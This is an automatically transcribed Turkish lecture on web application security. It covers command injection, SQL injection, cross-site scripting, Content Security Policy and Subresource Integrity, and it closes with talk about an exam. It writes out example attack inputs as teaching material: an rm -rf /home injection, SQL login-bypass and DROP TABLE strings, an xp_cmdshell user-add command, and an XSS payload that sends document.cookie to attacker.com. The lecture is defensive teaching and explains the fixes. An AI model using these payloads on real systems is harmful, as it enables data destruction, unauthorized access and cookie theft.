arka arkaya sırayla çalıştırmak
istiyorsanız birbirinden noktalı virgülle
ayırıyorsunuz. Bu pek çok
ortam için geçerli.
SQL'de de aynı şey var.
Yani iki tane SQL
küresini arka arkaya yazabilirsiniz
ve birbirinden noktalı virgülle
ayırabilirsiniz. O zaman önce biri çalışır
sonra ikincisi
çalışır. Bu kadar net.
Birincisi hata vermezse tabii ki ikincisi
çalışır. Hata verirse ortalık karışabilir de
önemli olan
bunların arka arkaya çalıştırılması.
Şimdi bakın saldırgan ne yapıyor?
myfile.txt'nin
noktalı virgül rm-rf-home
home
direktörü senin altındaki
her şeyi sileceksin diyor.
Bunu uçuracaksın diyor.
Recursive yapacaksın ve
remove'u force ile kullanman lazım
yoksa sorar sana emin misin diye
hatta remove etmez kötü bir
komutu olduğu için.
Site efekti kötü olduğu için.
İki komutu birbirinin
parametreyi birbirinden neyle ayırmış?
Noktalı virgülle ayırmış.
Birincisinin başına ne geldi?
head-n 100 myfile.txt
noktalı virgül rm-rf
slash home. Bakın sistem
şeyine
aktarılan, fonksiyona
aktarılan satır bu oldu.
Önce head komutu çalışacak
ondan sonra rm komutu çalışacak.
Tipik bir command
injection. Bunun için
gelen parametrenin
kontrol edilmesi gerekiyor.
Temizlenmesi gerekiyor.
Buna sanitization
teknik derim bu.
Temizlik
hizmetleri vardır ya
işte
belediyenin temizlik hizmeti,
kanalizasyon, çöp falan ona
sanitization. Bu anlamda
çer çöpün
uzaklaştırılması,
kirli girdilerin uzaklaştırılması
gerekiyor. Burada
atlanan şey kullanıcıdan
gelen input olduğu gibi
kullanılmış hiç değiştirilmeden.
Yapılabilecek en büyük hata.
Peki buna shell
injection command line injection
diyoruz. Bunu SQL'e nasıl
dönüştürüyoruz? Bakın basit bir
formumuz var.
Login alanı, pass alanı
işte
SQL değil mi? Login
işte şuradaki logine denk
düşüyor. Posttaki loginmiş.
Post edilen şeydeki
loginle gösterilen alan. Öbürü
password'a gösterilen alan.
SQL'de de select id from
users where username
eşittir. Login and password
eşittir. Password.
Result set'e ne
atanmış? DB execute
QR. SQL eğer
bu kullanıcı adı ve
bu şifrede biri varsa result set
bir tane şeyi döndürecek değil mi?
O zaman hani count
sıfırdan büyük olacak. Biz de diyeceğiz ki
tamam bu kullanıcı login.
SQL injection'i
yapılana kadar hani milyon tane
web sayfasında milyon tane
kişi böyle bir
şurada gördüğünüz
yapıdan geçerek
otantike oluyordu. Neredeyse yani
istisnasız bir şifrede. Peki bunun
sıkıntısı ne? Şimdi
düzgün kullanıcı
non malicious, düzgün input
pardon. Düzgün input yapıyoruz.
Kötü niyet yok burada.
Okey. Zakir kullanıcı
adı 123'te şifre.
QR'i çalıştı. Success. Süper.
Sisteme girildi.
Ama kullanıcı
yanlışlıkla formu doldururken
123'ten sonra bir tane
tek tırnak kullandı.
Hata oluştu. Bakın iki tane tek tırnak
yan yana geldi. Açılanı var
kapananı yok, kapananı var, açılanı
yok falan. SQL hatası oluştu.
Tamam sayfa hata verdi
ama kötü bir şey olmadı. Ancak
kullanıcının
adı
user id kısmı var ya Zakir'den sonra
kapanan tırnak ve
iki tane
tire işareti, eksi
işareti. SQL'de
yan yana gelen, boşluksuz
arka arkaya yan yana
gelen iki tane eksi tire
işareti
açıklama satırı demektir.
Ondan sonrasına bakmaz SQL.
Orada ne yazarsa yazar.
Bazı dillerde
diyezle kullanıyoruz.
Bazı dillerde iki tane
slash yaparak kullanıyoruz.
Bazı dillerde noktalı
virgülle kullanıyoruz. SQL'de de böyle
karar vermişler. Yan yana
iki tane eksi işareti,
tire işareti. Bakın
Zakir'den
sonra gelen ilk tırnak
Zakir'in
öncesindeki
tırnağı kapattı. Ondan sonra da
iki tane tire tire oldu.
Geri kalanının hiçbir önemi kalmadı.
Password için ne yazmışsınız?
Düzgün bir şey yazın ki
SQL sintaksı oluşmasın.
Sintaks erörü oluşmasın. Pardon.
Kullanıcı adını bilerek
sisteme girdiniz. Şifresini
bilmenize gerek bile yok. Çünkü
neden? Query bir anda neye dönüştü?
Ver user id eşittir Zakir'e
dönüştü. End kısmı
Query'den çıkartıldı.
Çünkü end öncesinde kullanıcı
ne gönderdi? İki tane
tire
işareti gönderdi.
Peki daha kötüsü
kullanıcının kim olduğunu bilmeme
gerek var mı? Hayır. Ona da gerek yok.
Bakın tire
or bir eşittir
tırnak
or bir eşittir bir
tire tire.
User id
boşluksa veya bir bire eşitse
bir bire eşit mi?
Kesinlikle eşit. Or
olduğuna göre şartlardan biri doğruysa
expression doğru.
Geri kalan kısmı da tire tire ile
devre dışı bırakıldı.
Kullanıcı adına ve
şifresine hiçbir şeye gerek yok.
Sisteme doğrudan
girdik. Daha da öteye
gidiyoruz.
User id alanına
ne koyduk arkadaşlar?
Yukarıdan tırnak
noktalı virgül drop table users
tire tire
ver user id
eşittir boşluk
bir şey yok
tamam select id seçilemeyecek
boşluk olan bir şey yok ama
ikinci komut çalışacak noktalı virgül
den sonra ikinci komut geliyor ya
drop table çalışacak.
Evet users tablosundan
kimseyi seçemedik
ama users tablosunu
drop ettik.
Dikkat edin login
formundan yapıyoruz bunu.
Ne kadar tehlikeli bir durum.
Microsoft
SQL Server
SQL üzerinden
hani
select gibi insert
gibi update gibi
bir query gönderilerek
herhangi bir sistem komutunun
çalışmasına izin veriyor.
XP alt çizgi cmd
share
çok güzel. Bir tane
Windows
command share açıyor. Yani
command line açıyor. O command
line'a aktarılan command
stringi veriyor. O da ona
aktarıyor, çalıştırıyor.
Output isterim veya istemem
isterim dersen de sonucu
bir SQL tablosu gibi
satır satır satır geri döndürüyor.
Bakın drop yerine
bu sefer ne yazdık?
Tırnağı kapattık. Noktalı virgül
exec xpcmd
net user add
user psvd
net komutu
Windows'ta network'ta
alakalı administration
yapmanın bir parçası.
Windows kullanıcıları aynı zamanda
network kullanıcıları olduğu için
Windows'a yeni bir kullanıcıyı
net user add'le ekleyebiliyoruz. Altta da
açıkça verilmiş. Nedenmiş?
net user add
user psvd
sisteme
adı usr olan
şifresi 123 olan bir kullanıcı ekledik.
Peki hangi seviyede oldu bu
kullanıcı? Local system account.
System account. Çünkü neden?
SQL Server
MS SQL Server
system account'u
olarak çalışıyor. O yetkiyle
çalışıyor. Onun eklediği
kullanıcı da local system account
seviyesinde olacak.
Güzel değil mi? Demek ki
eğer
gelen input'u temizlemezsek
o input'u kontrol etmezsek
onda bu tarz
kötü niyetli parçalar
olduğunu
var mı yok mu olup olmadığını
araştırmazsak
çok ciddi bir saldırı noktası
SQL'in. Tek bir
kuralı var. Kullanıcıdan gelen
input'a güvenmeyecek.
SQL
kuyarilerini siz oluşturmayacaksınız.
Yani nedir web uygulamasında
öyle adım adım
şuradaki gibi SQL kuyarisi
oluşturmayacaksınız. Bu felaket bir şey.
Web uygulamasının içerisinde select id
işte onda ona ekledim, bunda buna
ekledim. Böyle bir şey yapmayacaksınız.
Yapmanız gereken şey şu
çok basit. Ya
prepared parameterized SQL
kullanacaksınız ya da
SQL tablolarını
objektlere denk düşürdüğümüz
mapper yapısından
yararlanacaksınız ki ORM'de
sonuçta kendi arka
tarafında prepared SQL
kullanıyor. Bir farkı yok.
Böylece bakın
SQL hazır bekliyor.
Ne yapıyorsunuz
siz? Cursor execute
SQL diyorsunuz
iki tane parametre veriyorsunuz.
Sistem bu parametrelerin doğruluğunu
düzgünlüğünü kendisi kontrol ediyor.
Sizin web uygulamasında bir
temizlik yapmanıza gerek kalmıyor.
Öbür taraf zaten bunu yapıyor ve
merkezi olarak yapıyor.
Bundan ötürü
güvenmediğimiz dışarıdan gelen
veriyi temizlemiş oluyoruz.
İkincisi bu zaten
sürekli çalışacak bir şey değil mi?
Sistemimize login olması için kullanıyorsunuz
veyahut da işte fiyat
göstermek için bir şeyler için kullanıyorsunuz.
Bunun arka tarafta
cache'lendiğini düşünüp
SQL Server bu
SQL'i nasıl execute edeceğini
biliyor. O yüzden
daha hızlı execute ediyor.
Arada ciddi bir
hız farkı var. ORM'de
işte bakın burada bir tane
klas oluşturmuşum. O klas üzerinden
gerçekleştiriyorum.
id, name, email
alanı neyse. Ama ORM'de
bunu alıyor. Bir klas olarak
alıyor. Arka tarafta
parameterized işte
neyse prepared SQL
üzerinden çalıştırıp
sonucu bize geri döndürüyor.
Bunu yapmak zorundayız.
Başka türlü SQL injection'la
baş edebilmemizin
mümkünatı yok.
Şimdi cross-site scripting'e
gelelim.
XSS diye geçiyor.
Her tarafta dikkat edin cross kelimesi
var. Cross-site
request forgery var. Cross-site
scripting var. Birbirlerinden farklı şeyler.
Benzer gibi görünüyorlar ama
farklılar. Cross-site scripting'e
gözden geçirelim.
Şimdi command veya
SQL yani shell injection'da
veya SQL injection'da
inject edilen kod server'da
çalışıyor. Ama
cross-site scripting'de
inject edilen kod
diyelim, gönderilen kod
kötü niyetli kod nerede çalışıyor?
Browser'da çalışıyor.
Attack occurs when
application takes untrusted
data and sends it to a web browser
without proper validation or sanitization.
Yani web uygulaması
bir input'u alıyor,
bunu kontrol etmeden doğru mudur,
temiz midir, düzgün müdür, sanitization,
temizlik yapmadan
browser'a geri döndürüyor. Browser'da da bu çalışıyor.
Bakın
Google'daki standart
klasik search alanı.
Google.com search soru işareti
qqr'den geliyor,
eşittir search'da.
Şimdi bunun arka taraftaki
HTML'i, PHP'li,
yapıldığını varsayalım.
İşte PHP'de ne diyor?
echo $getq. Kullanıcı
get'le geliyor bu, değil mi?
Bu bir post değil. Çünkü
search'un yanında bakın şeyler var.
Bu bir post değil. Get'le geliyor. O zaman
get envari şeyinden
variable'larından
q olanı alacağım.
Kullanıcıya da results for ne girdiyse
onu göstereceğim. İşte
kullanıcı q eşittir apple girmiş.
Kullanıcıya results for apple göstereceğim.
Çok standart.
Tipik bir yapı.
Şimdi kullanıcı kalktı. Ne girdi arkadaşlar o alana?
Script girdi.
Script tagleriyle ve içine de
alert hello yazdı.
O zaman
kullanıcıya ne döndürülecek browser'a?
Results for script
alert hello
slash script.
Şimdi bakın javascript'in
en kötü şeylerinden bir tanesi
aslında öyle olması
gerekiyor ama hakikaten en kötü
noktalarından bir tanesi sayfanın her yeri
dinamik yapabilmek için
sayfanın her yerinde
script tag'i kullanılabilir.
Çünkü sayfanın her yeri dinamik olabilir.
O zaman browser orada script'i
gördüğü anda artık
onu bir tekst olarak
ekranda görüntülenecek bir şey olarak değerlendirmeyecek
ne yapacak? Javascript olarak
onu interpret edecek.
Sonuçta da results
for'dan sonra
ekrana bir tane popup window
çıkacak, alert window çıkacak
ve içinde de hello
yazacak. İşte buyurun size
cross-site scripting.
Input geldi
browser yani input kullanıcıdan
input geldi. Bu bir
script'le de aktarılmış olabilirdi
veyahut da doğrudan
browser'dan girilip de
location bar'dan da gönderilmiş olabilirdi.
Kontrol edilmedi.
İçeriğine bakılmadı.
Kullanıcıya geri döndürüldü. Kullanıcı da
bu farklı bir şekilde çalıştı.
Kullanıcı da aslında orada
bir
A1 formatında şey yazması gerekiyordu
ekranda results for
script alert diye
yazması. Ama o interpreted
çalıştırıldı. İşte buyurun
tipik bir
CSS yani
cross-site scripting XSS diyelim.
Çünkü öbürü Cascading Starship'de.
İşte bakın
buraya script içerisine
ne koydu? window open http
attacker com
cookie eşittir
soru işareti. Cookie eşittir
document cookie.
Ne yaptı? Benim
localimdeki cookie'leri
attacker com'a transfer etti.
Cookie theft
az önce de görmüştük. Yani neredeyse
bir saat önce konuşurken size
o örneği anlatmıştım.
Felaket bir şey.
Şimdi burada iki tane durum söz konusu.
Biri reflected. Az önce gördüklerimiz
reflected. Bir de stored.
Stored'da ne? Arka tarafta
bir database
geçiriyorsunuz. Oradan çünkü
uygulama sayfayı dinamik olarak
oluşturuyor ya. Uygulama
sayfayı oluştururken database'de
gördüğü bu alanı da
hop koyuyor ve browse'a
gönderiyor. Diğerinde
bir input size
geliyor. Siz onu proses ediyorsunuz
ama temizliğine, düzgünlüğüne bakmadan
tekrar geri gönderiyorsunuz.
Reflected yansıtılmış olanı veya stored
saklanmış olanı.
Örnek
PayPal kullanıcılarına yapılan bir
saldırı. PayPal kullanıcılarına
mail gönderiliyor ve deniyor ki
sizin çifreler, şeyler falan karıştı.
Çok büyük sıkıntı var. O yüzden
gidip bunları ne yapmanız
lazım? Tekrar gözden geçirmeniz
lazım. Bizim sizden
sizin olduğunuzdan emin
olmamız lazım.
Gönderilen sayfa aslında gerçek
bir PayPal
sayfası. Legitimate
dediği PayPal's website. Düzgün bir
ancak ne diyor?
Injected code redirected PayPal visitors.
It goes to a page.
Araya konulan
kod parçası kullanıcıları
ne yapıyor? Redirect ediyor.
Ya diyor işte senin
şifreni bir daha bir girmen lazım
veya kredi kartı bilgini bir daha bir gir
ben sistemdekiyle kontrol edeceğim.
Senin işte Gökhan olduğundan emin olacağım.
Bir phishing şeyi.
Böylece pek çok PayPal
kullanıcısının hassas
parayla alakalı
işte kredi kartı bilgisi
çalınmış oldu.
Stored XSS. Bunu da
genelde nerede, nereye
yapmayı seviyorlar?
Bluetoon boardlar, forumlar falan
var ya böyle topikler tartışılıyor,
böyle oluyor, böyle oluyor. İşte
PHEBB. Mesela bunun
diyelim ki SQL injection'a
açık bir tarafı var. Oradan
database'e giriyor. Sayfanın
dinamik oluşturulmasıyla alakalı
alanlardan birini
istediği kodu içerecek şekilde,
script'i içerecek şekilde, güncelce
ilerliyor ve bir anda
artık o sayfaya erişenler
render yani sayfa
web server tarafından
oluşturup buraya gönderilirken
o kötü haliyle karşılaşmış oluyorlar.
Semivore. Bunun en
güzel ve en önemli örneklerinden
biri.
Myspace'de bakın 20 saatte
1 milyon kullanıcıya
yayılıyor. Yaptığı şey şu
herkesin profile
page'inde
but most of all Semi is my hero
diye bir yazı gösteriyor.
Aynı zamanda
Semi'ye
bir arkadaşlık
isteğinde bulunuyor.
Yani düşünün
Semi'nin 20 saat içerisinde
1 milyon tane arkadaşı var.
Ne kadar güzel değil mi? 1 milyon
istek geliyor. Nereden kaynaklanıyor?
Myspace posting'lerde
html alanlarında
script, body, onclick,
ahrep, javascript
aklınıza gelebilecek her türlü şeyi filtrelediğini
düşünüyor. Ancak
cascading star sheet
tag'lerinde bunu yapmayı unutuyor.
Ve biri de kalkıyor
onun içerisindeki o alana
bakın javascript'i yerleştiriyor.
Olay bundan kaynaklanıyor.
Şimdi
CSS için yapabileceğimiz
en temel şey
kötü niyetli
tag'leri filtrelemek.
Bütün header'ları
ona bağlı olarak cookie'leri,
query string'leri, form alanlarını
her türlü şeyle yapmamız lazım.
Sanitization'dan,
temizlikten geçirmemiz lazım.
Şimdi burada böyle
hani bu negatiftir, bu pozitiftir,
bu atağa benziyordur,
bu benzemiyordur, bunun analizini yapmak çok zor.
Bakın
orijinal şey
img src javascript
alert document cookie
bu hani bizim anladığımız şey.
Aşağıda bunun
kodlanmış halini görüyorsunuz ve
fark edilene kadar
bu Google'ın
XSS filter'ından geçiyordu.
Google XSS filter
uyguluyorum diyor. Uyguluyor. Okey.
Ancak adam yukarıdaki
bakın şu satırı aşağıda böyle bir
tamamen
oktal formda
RGB renkleri kodlarcasına
o formda
kodlamış. İmajı öyle kodlayabiliyorsunuz.
Ve aslında oradan
javascript çıkıyor.
Felaket değil mi?
Javascript alert çıkıyor.
Şimdi
event handle'lar
bakın
on submit, on error, on sync restore
işte on window,
open, close
105 tane daha bile fazlası var.
Buralara gömülebilir.
Az önceki örneği gördüğünüz
CSS'teki işte
her türlü
alt alana gömülebilir.
Demek ki bizim
bu işi kendimizin
yapmaması lazım.
Ancak bunu yaptığını
söyleyen platformlara da
mesela wordpress bunlardan
bir tanesi işte publishing platformlarından
blog platformlarından
bir tanesi gözü kapalı güvenmemek
gerekiyor. Zaman zaman
incelemek gerekiyor. Uç
kullanıcılar için tabi bunun mümkünatı yok
ama siz sonuçta bilgisayar
mühendisi olacağınıza göre bu alanda
çalışacağınıza göre demek ki
bir web framework'ı
varsa ve ben bunu yapıyorum
derse şüpheli
yaklaşıp belirli uç noktaları
test etmeniz veyahutta nasıl
yaptığına dair dokümentasyon da
gerekiyorsa source kodlarına bakıp
bu incelemeyi yapmanız gerekiyor.
Bakın 2019'un
26 Mart'ında yani
bir buçuk sene öncesinde wordpress
5.1'de yaşanan
bir sıkıntı.
Stored xss yani
stored
içine xss'le beraber
geliyor düşünün.
Reflected
değil. Peki
şimdi
burada
aslında mesele ne?
Javascript çalıştırmada.
Javascript'i
inline
tag'lerin içerisine hani o div
meme css'in içerisine
gömüp çalıştırabileceğimiz gibi
açıkça include edip de
çalıştırabiliriz.
O zaman şu soru gündeme geliyor.
Hangi Javascript'e güveneceğim?
Hangi Javascript'e güvenmeyeceğim?
Örneğin
işte bankacılık uygulamasında
ben bir takım
güzel ekranlar oluşturmak istiyorum
bootstrap şudur budur falan
kullanmak istiyorum. O Javascript'ini
gidip öbür taraftan alacağım.
Orası ele geçerse ne olacak
gibi sorular var.
Şimdi burada
burada
devreye
content
security policy
giriyor.
Diyor ki default source self
yani bu sayfa
sadece bu sayfayı host eden
server'dan alınabilir.
Inline
script'ler çalıştırılmaz.
Inline style'ler işlenmez.
Hepsinin include'la
eklenmiş
olması lazım.
İçine hani az önce gördük ya böyle
results for orada birden
bire script'le başlıyor. Yok öyle
bir şey. Bunlar çalıştırılmayacak.
Eğer sayfada bu varsa
browser bunu çalıştırmıyor.
Daha
farklı bir hali. Yine
birinci kural öncekiyle aynı.
İmajlar her yerden alınabilir.
Script'ler ise
sadece cdn
cquery.com'dan alınabilir. Yine
inline script'ler çalıştırılamaz.
Inline style'ler çalıştırılamaz.
Peki
şimdi az önce söylediğim olay.
SAP Resource Integrity
şu kod cquery.com'dan
şeyi alıyoruz ya
library'i alıyoruz ya. Bakın script
böyle include edilmiş.
Source olarak include edilmiş.
Inline olarak yapılmamış.
Peki birileri buraya saldırır ve
bu script'i ele geçirirse
değiştirirse. Gerçekleşen
bir şey 2013 yılında az önce
örneğini verdim. Bootstrap
ele geçirildi.
Bootstrap'ten ayrılan bir
mühendisin account'u zamanında
kapatılmıyor veya başka bir şeyler oluyor.
Saldırganlar o account'u ele geçiriyorlar
ve bootstrap java
script'i öyle bir modifiye ediyorlar ki
işte
cross-site scripting'e sebep oluyor.
Bunun
tek bir çözümü var. SAP Resource Integrity.
Bir
resource'u işte
SAP Resource nedir?
Bir java kütüphanesi, java script kütüphanesi.
Bunun
integritesini hash
değeriyle belirliyoruz.
Ve diyoruz ki
buradan bu yüklendiğinde
yani bunu host eden
server'da
onun hash değeri var.
O server'dan geliyor.
Script code cquery.com'dan
geliyor. Browser
code cquery.com'dan
gelen şu cquery
3 4 0 min.js'in
secure hash'ini hesaplıyor.
O secure hash'i browser'dan
server'dan gelen, şurada
integrity alanında belirtilmiş olan
değerle karşılaştığı.
Eğer ikisi eşitse
tamam diyor bu bozulmamış.
Server'ın
kullanılmasını öngördüğü
script. Ki bu
kriptografik hash değerleri
hakikaten
bir bit değişse bile
sonucu değiştiren yöntemlerin
üzerine kurulu. Ondan
ötürü gönlümüz
burada rahat oluyor.
Evet arkadaşlar.
Bugünkü dersimiz
bu kadar.
Şimdi bugün
az önce de söylediğim gibi
Fuat hocanız
size uygulama
yapacak.
Haftaya sınav var mı?
Ali Asaf sınav haftası ise
haftaya var tabi ki.
Yani niye yapmayalım?
Sınav haftası değil mi haftaya?
Hocam sınavlar ders saatinde mi
olacak yoksa farklı bir zamanda mı olacak?
Utku hocanız duyurur.
Onunla benim hiçbir
alakam yok. Ya Utku hocanız
duyurur ya Yunus Emre hocanız duyurur.
Bazı derslerin sınavı
yok mu? Haberim yok
yani. Ama bizim
dersimizin sınavı var yani. Haftaya mı sınavı yok
hiç mi sınavı yok?
Muhammed. Haftaya yok
yani tamam. Biz haftaya
yaparız yani bilmiyorum. Utku
hocanız bize de bir şeyler yani bize bir takım
ön şeyler gönderdi ama netleşen bir şey
yok. Üzerinde çalışıyor.
Yani duyuracaktır diye tahmin
ediyorum.
Konu benim haricimde yani
bir hafta mı önce açıklanır bir gün
önce mi açıklanır onu benimle tartışmayın.
Onu hocanıza sorun.
Ders programıyla yani
daha doğrusu vize programı
bir şekilde sayfada duyurulacaktır.
Ama ne hazırlayan benim
ne yetkilisi benim sınav
her zamanki gibi olacak.
Bunu en başta birinci
derste konuştuk ya senle.
Yani her türlü şeyi
sorabiliriz dedik. Çoktan seçme yani şey
test usulü artı
belki şey usulü. Sınav sistemini
de görmemiz lazım. Nasıl bir sınav sistemi
olacak o da heyecanla beklediğimiz şeylerden
bir tanesi. Şeyi konuştuk
ben size ilk derste anlattım. Yani
test usulü yapacağız.
Ama sistemin
teste neleri ne şekilde
desteklediğini bilmiyoruz.
Test haricinde klasik
soru da sorabiliriz.
Bunu da yapabiliriz dedik. Bunların
bir karışımı da olabilir.
Sınavın bir kısmı test diğer kısmı
klasik soru ikisi
birleştirilebilir. Bunların hepsini
yapabiliriz. Tamam mı?
Ama yani bu sorduğunuz
diğer işte ne zaman
ilan edilmesi lazım falan benim
haricimde bir şey.
Evet
herkese iyi günler o zaman.
Sağlıcakla kalın arkadaşlar.
Görüşmek üzere.